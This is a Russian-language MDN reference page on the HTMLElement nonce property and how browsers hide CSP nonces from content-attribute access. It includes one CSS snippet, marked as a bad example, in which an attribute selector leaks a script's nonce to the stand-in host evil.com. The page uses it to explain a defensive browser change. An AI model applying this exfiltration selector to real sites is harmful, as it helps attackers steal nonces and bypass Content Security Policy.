---
title: "HTMLElement: свойство nonce"
slug: Web/API/HTMLElement/nonce
l10n:
  sourceCommit: a3d9f61a8990ba7b53bda9748d1f26a9e9810b18
---

{{APIRef("HTML DOM")}}

Свойство **`nonce`** интерфейса {{DOMxRef("HTMLElement")}} возвращает одноразовый криптографический код, используемый [Content Security Policy](/ru/docs/Web/HTTP/Guides/CSP) для определения возможности продолжения обработки запроса.

В современных реализациях элементы предоставляют свой атрибут `nonce` только скриптам (но не CSS-селекторам, например).

## Примеры

### Получение значения nonce

В прошлом не все браузеры поддерживали IDL-атрибут `nonce`, поэтому было распространено использование [`getAttribute`](/ru/docs/Web/API/Element/getAttribute) в качестве запасного варианта:

```js
let nonce = script["nonce"] || script.getAttribute("nonce");
```

Современные браузеры не дают получить значения `nonce` таким путём (будет возвращена пустая строка). IDL-свойство (`script['nonce']`) является единственным способом получения `nonce`.

Скрытие `nonce` помогает предотвратить их получение злоумышленниками с помощью механизмов, которые могут собирать данные из атрибутов содержимого, таких как этот селектор CSS:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Спецификации

{{Specifications}}

## Совместимость с браузерами

{{Compat}}

## Смотрите также

- [Глобальный атрибут `nonce`](/ru/docs/Web/HTML/Global_attributes/nonce)
- [Content Security Policy](/ru/docs/Web/HTTP/Guides/CSP)
- CSP: {{CSP("script-src")}}
